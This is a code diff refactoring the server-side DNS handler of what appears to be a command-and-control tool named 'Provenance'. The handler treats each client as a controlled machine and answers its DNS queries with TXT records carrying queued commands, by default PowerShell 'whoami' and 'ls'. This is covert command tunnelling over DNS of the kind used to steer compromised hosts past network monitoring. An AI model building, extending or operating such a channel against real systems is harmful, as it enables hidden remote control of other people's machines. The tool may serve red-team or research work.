@@ -1,8 +1,9 @@
 import dnslib
-from socketserver import BaseRequestHandler
+from . import ProtocolHandler
 
 
-class IndividualClientHandler(BaseRequestHandler):
+@ProtocolHandler.register # Abstract Base Class registration
+class DNSHandler():
     """ This represents a machine being controlled by Provenance"""
     RR = {
         "TXT": (dnslib.QTYPE.TXT, dnslib.TXT)
@@ -15,49 +16,36 @@ class IndividualClientHandler(BaseRequestHandler):
     }
 
     """ Builtin Functions"""
-    def __init__(self, request, client_address, server, rrtype="TXT", name=None):
-        # Superclass initialization
-        self.server = server
-        self.request = request
-        self.client_address = client_address
-
-        # Subclass Initialization
+    def __init__(self, ip, port, socket, rrtype="TXT", name=None):
+        self.ip = ip
+        self.port = port
+        self.socket = socket
         self.name = name
-        self.ip = client_address[0]
-        self.active = False
         self.record_type = rrtype
         self.latest_request_id = None
-        self.latest_request_confirmed = False
         self.queued_commands = [("POWERSHELL_EXECUTE", "whoami"), ("POWERSHELL_EXECUTE", "ls")]
         self.sent_commands = []
     
     def __repr__(self):
         return f"{self.name}{{{self.ip}, {self.record_type}}}"
+    
 
-    """ Subclass Functions"""
-    def handle(self):
-        data = self.get_data()
+    """ Handler functions """
+    def queue_cmd(self, cmd_type, cmd):
+        self.queued_commands.append((self.command_type[cmd_type], cmd))
+
+
+    def handle_request(self, raw_request):
+        data = raw_request[0].strip()
         try:
             request = dnslib.DNSRecord.parse(data)
             if request.header.id != self.latest_request_id:
                 if request.header.get_opcode() == 0:
                     self.latest_request_id = request.header.id
-                    self.latest_request_confirmed = False
                     self.send_cmd(request)
         except dnslib.DNSError:
             print("[INFO] Incorrectly formatted DNS Query. Skipping")
-
-    def get_data(self):
-        return self.request[0].strip()
-
-    """ Provenance Specific Functions"""
-    def queue_cmd(self, cmd_type, cmd):
-        self.queued_commands.append((self.command_type[cmd_type], cmd))
-
-    def send_ack(self, request):
-        ack = request.reply()
-        socket = self.request[1]
-        socket.sendto(ack.pack(), self.client_address)
+    
 
     def send_cmd(self, request):
         if self.queued_commands:
@@ -78,7 +66,7 @@ class IndividualClientHandler(BaseRequestHandler):
                 rdata=rr_constructor(f"<{self.command_type[opcode]}>:{cmd}"),
                 ttl=1337))
         # send command
-        socket = self.request[1]
-        print(f"[INFO] Sending '{cmd}' to {self.client_address[0]}")
-        socket.sendto(command_packet.pack(), self.client_address)
+        print(f"[INFO] Sending '{cmd}' to {(self.ip, self.port)}")
+        self.socket.sendto(command_packet.pack(), (self.ip, self.port))
         self.sent_commands.append((request.header.id, cmd))
+
